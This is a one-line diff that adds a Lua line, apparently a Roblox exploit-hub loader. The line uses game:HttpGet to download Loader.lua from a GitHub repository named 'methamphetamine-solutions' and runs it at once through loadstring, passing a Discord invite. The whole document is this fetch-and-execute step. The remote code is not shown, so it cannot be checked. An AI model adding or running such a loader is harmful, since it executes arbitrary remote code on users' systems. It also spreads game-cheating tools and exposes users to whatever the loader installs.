@@ -1,0 +1,1 @@
+loadstring(game:HttpGet'https://raw.githubusercontent.com/ao-0/methamphetamine-solutions/main/Loader.lua')("https://discord.gg/curPv7uhQc")
